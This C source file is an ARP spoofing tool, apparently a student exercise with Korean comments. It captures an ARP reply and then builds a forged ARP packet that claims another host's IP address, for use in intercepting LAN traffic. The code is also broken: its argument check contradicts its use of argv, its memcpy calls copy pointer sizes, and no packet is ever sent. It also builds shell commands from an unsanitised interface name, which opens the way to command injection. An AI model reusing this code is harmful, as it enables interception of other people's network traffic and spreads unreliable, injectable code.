#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <stdint.h>
#include <string.h>
#include <sys/socket.h>
#include "header_lib.h"


struct sniff_ip_hdr* iph;
struct sniff_tcp_hdr* tcph;
struct sniff_arp_hdr* arph_receive;


char *payload;
u_int size_ip;
u_int size_tcp;


int get_my_ip_str(char *dev, char *str, int len);
int get_my_mac_str(char *dev, char *str, int len);
void send_arp_packet(char* argv[], pcap_t* handle, int state);


void usage() {
    printf("syntax: send_arp <interface> <sender ip> <target ip>\n");
    printf("sample: send_arp wlan0 192.168.0.1 192.168.0.7\n");
}


int main(int argc, char* argv[]) { 
    if (argc != 2) {
    usage();
    return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

    if (handle == NULL) {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    return -1;
    }

    send_arp_packet(argv, handle, NORMAL);
    struct sniff_ethernet *ether;

  while (true) {
    struct pcap_pkthdr* header;
    const u_char* packet;
    int res = pcap_next_ex(handle, &header, &packet);
    if (res == 0) continue;
    if (res == -1 || res == -2) break;
    printf("\n============%u bytes captured============\n", header->caplen);
    ether = (struct sniff_ethernet *)packet;


    /* ARP 패킷이 맞다면 패킷값 출력*/
    if (ntohs(ether->type)== 0x0806) 
    {   /* ARP 헤더의 데이터 */
        arph_receive = (struct sniff_arp_hdr *)(packet + sizeof(struct sniff_ethernet));
        printf("\n================= ARP Packet ==============================\n");
        printf("src address : ");
        for(int i=0; i < IP_V; i++){
            printf("%d.", arph_receive->send_ip[i]);
        }
        printf("\ndst address : ");
        for(int i=0; i < IP_V; i++){
            printf("%d.", arph_receive->target_ip[i]);
        }
        printf("\nARP type : %u\n", ntohs(arph_receive->arp_opcode));


        printf("================ src MAC address ==============\n");
        for(int i=0; i < ETHER_ALEN; i++ ){
            printf("%02x:", arph_receive->send_mac[i]);
        }
        printf("\n================ dst MAC address ==============\n");
        for(int i=0; i < ETHER_ALEN; i++){
            printf("%02x:", arph_receive->target_mac[i]);
        }
        printf("\n");
        break;
    }
  }

  send_arp_packet(argv, handle, ABNORMAL);
  printf("\ngot Spoofing\n");

  return 0;
}




int get_my_ip_str(char *dev, char *str, int len) {
        FILE* fp;
        char cmdbuf[256];
        sprintf(cmdbuf, "/bin/bash -c \"ifconfig %s\" | grep \"inet \" | awk '{print $2}'\n", dev);
        fp = popen(cmdbuf, "r");
        if (fp == NULL) {
                perror("Fail to fetch mac address\n");
                return EXIT_FAILURE;
        }
        fgets(str, len, fp);
        pclose(fp);
        return EXIT_SUCCESS;
}

int get_my_mac_str(char *dev, char *str, int len) {
        FILE* fp;
        char cmdbuf[256];
        sprintf(cmdbuf, "/bin/bash -c \"ifconfig %s\" | grep '[ ][0-9a-zA-Z][0-9a-zA-Z]:[0-9a-zA-Z][0-9a-zA-Z]:[0-9a-zA-Z][0-9a-zA-Z]:[0-9a-zA-Z][0-9a-zA-Z]:[0-9a-zA-Z][0-9a-zA-Z]:[0-9a-zA-Z][0-9a-zA-Z]' | awk '{print $2}'", dev);
        fp = popen(cmdbuf, "r");
        if (fp == NULL) {
                perror("Fail to fetch IPv4 address\n");
                return EXIT_FAILURE;
        }
        fgets(str, len, fp);
        pclose(fp);
        return EXIT_SUCCESS;
}

void send_arp_packet(char* argv[], pcap_t* handle, int state) {
    struct sniff_ethernet* ethernet;
    struct sniff_arp_hdr* arp_header;

    /* 패킷 전송 */
    u_char send_packet[500];
    memset(send_packet, 0, sizeof(send_packet));
    char my_ip[30];
    char my_mac[30];

    /* 이더넷 ip, mac 패킷 받아들임*/
    get_my_ip_str(argv[1], my_ip, sizeof(my_ip));
    get_my_mac_str(argv[1], my_mac, sizeof(my_mac));


    /* 이더넷 패킷 설정 */
    ethernet = (struct sniff_ethernet*)send_packet;
    
    
    /* 이더넷 프로토콜 ARP타입 */
    ethernet->type = ntohs(0x0806);
    sscanf(my_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &ethernet->ether_shost[0],&ethernet->ether_shost[1],&ethernet->ether_shost[2],
            &ethernet->ether_shost[3],&ethernet->ether_shost[4],&ethernet->ether_shost[5]);

    memcpy(send_packet, &ethernet, sizeof(ethernet));

    arp_header = (struct sniff_arp_hdr*)(send_packet + sizeof(struct eth_hdr));
    arp_header->arp_htype = ntohs(ARPH_ETHER);
    arp_header->arp_ptype = ntohs(0x0800);
    arp_header->arp_hlen = 6;
    arp_header->arp_plen = 4;
    arp_header->arp_opcode = ntohs(1);

      sscanf(argv[2], "%hhd.%hhd.%hhd.%hhd",
              &arp_header->target_ip[0],&arp_header->target_ip[1],
              &arp_header->target_ip[2],&arp_header->target_ip[3]);

      if(state == NORMAL) {
        sscanf(my_ip, "%hhd.%hhd.%hhd.%hhd",
               &arp_header->send_ip[0],&arp_header->send_ip[1],
               &arp_header->send_ip[2],&arp_header->send_ip[3]);
        sscanf(my_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &arp_header->send_mac[0],&arp_header->send_mac[1],&arp_header->send_mac[2],
               &arp_header->send_mac[3],&arp_header->send_mac[4],&arp_header->send_mac[5]);
      }
      else {
        sscanf(argv[3], "%hhd.%hhd.%hhd.%hhd", &arp_header->send_ip[0],&arp_header->send_ip[1],
                &arp_header->send_ip[2],&arp_header->send_ip[3]);
        sscanf(my_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &arp_header->send_mac[0],&arp_header->send_mac[1],&arp_header->send_mac[2],
               &arp_header->send_mac[3],&arp_header->send_mac[4],&arp_header->send_mac[5]);
        for(int i = 0; i < 6; i++)
            arp_header->target_mac[i] = arph_receive->target_mac[i];
      }

      memcpy(send_packet+sizeof(ethernet), &arp_header, sizeof(arp_header));

      return;

}
